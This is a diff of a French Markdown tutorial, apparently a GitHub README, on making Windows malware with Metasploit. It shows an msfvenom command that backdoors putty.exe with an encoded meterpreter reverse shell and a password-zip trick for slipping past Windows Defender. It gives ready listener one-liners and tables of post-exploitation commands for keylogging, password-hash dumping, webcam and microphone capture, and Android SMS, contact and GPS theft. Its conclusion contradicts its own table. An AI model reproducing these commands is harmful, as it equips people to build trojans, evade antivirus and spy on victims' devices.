@@ -382,34 +382,246 @@ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 
 msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -e x64/xor_dynamic -i 10 -f raw | msfvenom -a x64 --platform windows -e x86/shikata_ga_nai -i 10 -x /root/putty.exe -k -f exe -o /home/kali/Desktop/double_encoded_putty.exe
 ```
 
+je me suis beaucoup entrainer -__-
+
+#### apres beaucoup de test j ai remarquer que aucun des malwar present ici ne passer la detection des nouveau anti virus ainsi que la derniere mise a jour de windows defender dans windows 11 pour pouvoir tester tous les malwars sur windows 10 de votre virtual box vous devez passer par un dossier partager entre votre kali linux et votre pc .
+
+<img width="1023" height="646" alt="image" src="https://github.com/user-attachments/assets/426be2fc-849c-4e40-9409-70f542313353" />
+
+ensuite il suffira de glisser et deposer depuis le racoursis dans votre kali linux mais cela marchera que pour les malwar tres bien fabriquer qui passe les anti virus car windows defender va mettre en quarantaine votre fichier alors ou vous desactivé temporairement windows defender ou vous taper cette commande avec le bon chemin qui permettra de faire passer le virus pour le tester 
+
+````bash
+zip -e -P defender_bypass /home/kali/Desktop/putty_ultimate.zip /home/kali/Desktop/putty_ultimate.exe
+````
+puis envoyer le dans votre vm dans widow 10 desZiper et ouvrir le malwar ensuite revenait dans kali linux et demmarrer le port d ecoute .
+
+## TABLEAU DES COMMANDES D'ÉCOUTE AVEC EXPLICATIONS
+
+| Commande | Signification | Exemple d'utilisation |
+|----------|---------------|----------------------|
+| `msfconsole` | Lance l'interface Metasploit | `msfconsole` |
+| `-q` | Démarre sans la bannière d'accueil | `msfconsole -q` |
+| `-x "commande"` | Exécute une commande au démarrage | `msfconsole -x "help"` |
+| `use exploit/multi/handler` | Charge le module d'écoute | `use exploit/multi/handler` |
+| `set PAYLOAD ...` | Définit le payload à écouter | `set PAYLOAD windows/x64/meterpreter_reverse_tcp` |
+| `set LHOST ...` | Définit l'adresse IP d'écoute | `set LHOST 192.168.56.101` |
+| `set LPORT ...` | Définit le port d'écoute | `set LPORT 4444` |
+| `set ExitOnSession false` | Garde l'écoute active après une session | `set ExitOnSession false` |
+| `exploit -j` | Lance l'exploit en arrière-plan | `exploit -j` |
+
 ---
 
-###  AES CHIFFRÉ (Niveau Expert)
+## EXEMPLES COMPLETS DÉTAILLÉS
+
+### Exemple 1 : Écoute TCP standard
 
 ```bash
-# Étape 1 : Générer le shellcode
-msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f raw -o /home/kali/Desktop/shellcode.bin
+msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_tcp; set LHOST 192.168.56.101; set LPORT 4444; set ExitOnSession false; exploit -j"
 ```
-````bash
-# Etape2 : Installer pycryptodome via APT
-apt update && apt install python3-pycryptodome -y
-```` 
-```bash
-# Étape 3: Chiffrer avec AES
-python3 -c "
-from Crypto.Cipher import AES
-from Crypto.Util.Padding import pad
-import os
 
-key = os.urandom(32)
-iv = os.urandom(16)
-with open('/home/kali/Desktop/shellcode.bin', 'rb') as f:
-    data = f.read()
-cipher = AES.new(key, AES.MODE_CBC, iv)
-encrypted = cipher.encrypt(pad(data, AES.block_size))
-with open('/home/kali/Desktop/encrypted.bin', 'wb') as f:
-    f.write(iv + encrypted)
-print('Clé AES (hex):', key.hex())
-"
-````
-je me suis beaucoup entrainer -__-
+### Exemple 2 : Écoute HTTPS
+
+```bash
+sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_https; set LHOST 192.168.56.101; set LPORT 443; set ExitOnSession false; exploit -j"
+```
+
+### Exemple 2 : Écoute 32-bit (pour Shellter)
+
+```bash
+msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter_reverse_tcp; set LHOST 192.168.56.101; set LPORT 4444; set ExitOnSession false; exploit -j"
+```
+
+## SYNTAXE GÉNÉRALE
+
+```bash
+msfconsole -q -x "use exploit/multi/handler; set PAYLOAD [PAYLOAD]; set LHOST [VOTRE_IP]; set LPORT [VOTRE_PORT]; set ExitOnSession false; exploit -j"
+```
+
+**À remplacer :**
+- `[PAYLOAD]` : Le même que dans msfvenom
+- `[VOTRE_IP]` : L'IP de Kali (192.168.56.101)
+- `[VOTRE_PORT]` : Le port utilisé dans msfvenom
+
+---
+
+## A retenir 
+
+| Règle | Explication |
+|-------|-------------|
+| **1. PAYLOAD identique** | Le payload dans msfvenom ET msfconsole doit être le même |
+| **2. LHOST identique** | L'IP doit être la même dans les deux commandes |
+| **3. LPORT identique** | Le port doit être le même dans les deux commandes |
+| **4. HTTPS = sudo** | Le port 443 nécessite `sudo` pour l'écoute |
+| **5. 32-bit = sans x64** | Pour Shellter, utiliser `windows/meterpreter_reverse_tcp` (sans x64) |
+
+## maintenant nous savons faire des petit malwar intermediaire mais qui ne passe pas les nouvelle tehcnologie de type window 11 defender 
+## nous faire un port d ecoute mais on se demande encore ok mais qu est ce qu on peut bien faire maintenant.
+## voila la list des commande faisable si vous avez une connexion depuis une cible :
+
+# Commandes Meterpreter pour toutes les plateformes
+
+---
+
+### 1. Commandes communes à toutes les plateformes
+
+| Commande | Description | Exemple |
+|----------|-------------|---------|
+| `sysinfo` | Informations système | `sysinfo` → Affiche OS, architecture, hostname |
+| `getuid` | Utilisateur actuel | `getuid` → `USER: DESKTOP-ABC\Administrateur` |
+| `getpid` | PID du processus actuel | `getpid` → `Current PID: 1234` |
+| `pwd` | Répertoire actuel | `pwd` → `C:\Users\Public` |
+| `cd` | Changer de répertoire | `cd C:\Windows\System32` |
+| `ls` | Lister les fichiers | `ls` → Liste les fichiers du dossier |
+| `cat` | Afficher un fichier | `cat secret.txt` → Affiche le contenu |
+| `download` | Télécharger un fichier | `download C:\secret.txt /home/kali/Desktop/` |
+| `upload` | Uploader un fichier | `upload /home/kali/payload.exe C:\Users\Public\` |
+| `search` | Rechercher des fichiers | `search -f *.docx` → Cherche les Word |
+| `shell` | Ouvrir un shell | `shell` → Ouvre cmd.exe |
+| `exit` | Quitter | `exit` → Ferme la session |
+| `background` | Mettre en arrière-plan | `background` → Retourne à msfconsole |
+
+---
+
+### 2. Commandes spécifiques Windows
+
+| Commande | Description | Exemple |
+|----------|-------------|---------|
+| `screenshot` | Capture d'écran | `screenshot` → Capture sauvegardée sur Kali |
+| `keyscan_start` | Démarrer keylogger | `keyscan_start` → Enregistre les touches |
+| `keyscan_dump` | Récupérer les frappes | `keyscan_dump` → Affiche "MotDePasse123" |
+| `keyscan_stop` | Arrêter keylogger | `keyscan_stop` → Arrête l'enregistrement |
+| `hashdump` | Récupérer les mots de passe | `hashdump` → Affiche les hashes SAM |
+| `getsystem` | Obtenir SYSTEM | `getsystem` → Élève les privilèges |
+| `migrate` | Migrer vers un autre processus | `migrate 5678` → Migre vers explorer.exe |
+| `ps` | Lister les processus | `ps` → Affiche tous les processus |
+| `kill` | Tuer un processus | `kill 1234` → Tue le processus 1234 |
+| `reboot` | Redémarrer | `reboot` → Redémarre la machine |
+| `shutdown` | Éteindre | `shutdown` → Éteint la machine |
+| `webcam_snap` | Photo webcam | `webcam_snap` → Capture photo |
+| `record_mic` | Enregistrer micro | `record_mic` → Enregistrement audio |
+| `ipconfig` | Interfaces réseau | `ipconfig` → Affiche IP, masque, passerelle |
+| `arp` | Table ARP | `arp` → Affiche les adresses MAC |
+| `netstat` | Connexions réseau | `netstat` → Affiche les ports ouverts |
+| `run post/windows/gather/enum_users` | Énumérer les utilisateurs | `run post/windows/gather/enum_users` |
+| `run post/windows/gather/checkvm` | Vérifier si VM | `run post/windows/gather/checkvm` |
+
+---
+
+### 3. Commandes spécifiques Linux
+
+| Commande | Description | Exemple |
+|----------|-------------|---------|
+| `screenshot` | Capture d'écran (X11) | `screenshot` → Capture sauvegardée |
+| `getsystem` | Tenter d'obtenir root | `getsystem` → `sudo` si possible |
+| `ps` | Lister les processus | `ps` → Affiche tous les processus |
+| `kill` | Tuer un processus | `kill 1234` → Tue le processus |
+| `reboot` | Redémarrer | `reboot` → Redémarre |
+| `shutdown` | Éteindre | `shutdown` → Éteint |
+| `ifconfig` | Interfaces réseau | `ifconfig` → Affiche IP, masque |
+| `netstat` | Connexions réseau | `netstat` → Affiche les ports |
+| `run post/linux/gather/enum_configs` | Énumérer les configurations | `run post/linux/gather/enum_configs` |
+| `run post/linux/gather/enum_users` | Énumérer les utilisateurs | `run post/linux/gather/enum_users` |
+| `run post/linux/gather/enum_network` | Énumérer le réseau | `run post/linux/gather/enum_network` |
+| `run post/linux/gather/enum_services` | Énumérer les services | `run post/linux/gather/enum_services` |
+
+** Attention :** Keylogger, webcam, microphone et hashdump ne fonctionnent pas sous Linux.
+
+---
+
+### 4. Commandes spécifiques Android
+
+| Commande | Description | Exemple |
+|----------|-------------|---------|
+| `webcam_snap` | Photo webcam | `webcam_snap` → Capture photo |
+| `webcam_stream` | Flux webcam | `webcam_stream` → Flux vidéo |
+| `record_mic` | Enregistrement microphone | `record_mic` → Enregistrement audio |
+| `dump_calllog` | Récupérer historique appels | `dump_calllog` → Affiche les appels |
+| `dump_contacts` | Récupérer contacts | `dump_contacts` → Affiche les contacts |
+| `dump_sms` | Récupérer SMS | `dump_sms` → Affiche les SMS |
+| `geo_loc` | Géolocalisation GPS | `geo_loc` → Affiche coordonnées GPS |
+| `set_wifi` | Configurer WiFi | `set_wifi` → Active/désactive WiFi |
+| `get_system_info` | Infos système Android | `get_system_info` → Android version, modèle |
+| `check_root` | Vérifier si root | `check_root` → Root activé ? |
+| `run post/android/gather/enum_apps` | Énumérer applications | `run post/android/gather/enum_apps` |
+
+** Attention :** Keylogger, screenshot, hashdump, getsystem et migration ne fonctionnent pas sous Android.
+
+---
+
+### 5. Commandes spécifiques macOS
+
+| Commande | Description | Exemple |
+|----------|-------------|---------|
+| `screenshot` | Capture d'écran | `screenshot` → Capture sauvegardée |
+| `ps` | Lister les processus | `ps` → Affiche tous les processus |
+| `kill` | Tuer un processus | `kill 1234` → Tue le processus |
+| `getsystem` | Tenter d'obtenir root | `getsystem` → `sudo` si possible |
+| `hashdump` | Récupérer les mots de passe | `hashdump` → Affiche les hashes |
+| `keylog_start` | Démarrer keylogger | `keylog_start` → Enregistre les touches |
+| `keylog_dump` | Récupérer les frappes | `keylog_dump` → Affiche les touches |
+| `ipconfig` | Interfaces réseau | `ipconfig` → Affiche IP, masque |
+| `netstat` | Connexions réseau | `netstat` → Affiche les ports |
+| `run post/osx/gather/enum_network` | Énumérer le réseau | `run post/osx/gather/enum_network` |
+| `run post/osx/gather/enum_users` | Énumérer utilisateurs | `run post/osx/gather/enum_users` |
+
+** Attention :** Keylogger fonctionne mais nécessite des droits.
+
+---
+
+## TABLEAU RÉCAPITULATIF
+
+| Commande | Windows | Linux | Android | macOS |
+|----------|---------|-------|---------|-------|
+| `sysinfo` | ✅ | ✅ | ✅ | ✅ |
+| `getuid` | ✅ | ✅ | ✅ | ✅ |
+| `shell` | ✅ | ✅ | ✅ | ✅ |
+| `download` | ✅ | ✅ | ✅ | ✅ |
+| `upload` | ✅ | ✅ | ✅ | ✅ |
+| `screenshot` | ✅ | ✅ | ❌ | ✅ |
+| `keyscan_start` | ✅ | ❌ | ❌ | ✅ |
+| `keyscan_dump` | ✅ | ❌ | ❌ | ✅ |
+| `hashdump` | ✅ | ❌ | ❌ | ✅ |
+| `getsystem` | ✅ | ✅ | ❌ | ✅ |
+| `migrate` | ✅ | ✅ | ❌ | ✅ |
+| `ps` | ✅ | ✅ | ✅ | ✅ |
+| `webcam_snap` | ✅ | ❌ | ✅ | ❌ |
+| `record_mic` | ✅ | ❌ | ✅ | ❌ |
+| `dump_calllog` | ❌ | ❌ | ✅ | ❌ |
+| `dump_contacts` | ❌ | ❌ | ✅ | ❌ |
+| `dump_sms` | ❌ | ❌ | ✅ | ❌ |
+| `geo_loc` | ❌ | ❌ | ✅ | ❌ |
+
+---
+
+## COMMANDES UNIVERSELLES (fonctionnent partout)
+
+```bash
+sysinfo         # Infos système
+getuid          # Utilisateur
+pwd             # Répertoire actuel
+cd              # Changer de répertoire
+ls              # Lister les fichiers
+cat             # Afficher un fichier
+download        # Télécharger
+upload          # Uploader
+search          # Rechercher
+shell           # Ouvrir un shell
+exit            # Quitter
+background      # Arrière-plan
+```
+
+---
+
+## RAPPEL : PAYLOAD = CAPACITÉS
+
+| Payload | Capacités |
+|---------|-----------|
+| `windows/x64/meterpreter_reverse_tcp` | Toutes les commandes Windows |
+| `linux/x64/meterpreter_reverse_tcp` | Commandes Linux (pas keylogger, webcam) |
+| `android/meterpreter_reverse_tcp` | Commandes Android (contacts, SMS, GPS) |
+| `php/meterpreter_reverse_tcp` | Commandes PHP limitées |
+| `python/meterpreter_reverse_tcp` | Commandes Python limitées |
+
+---
+
+**Conclusion :** Les commandes `screenshot`, `keyscan` et `hashdump` fonctionnent **uniquement sous Windows**. Sous Linux, Android ou macOS, certaines commandes sont indisponibles.
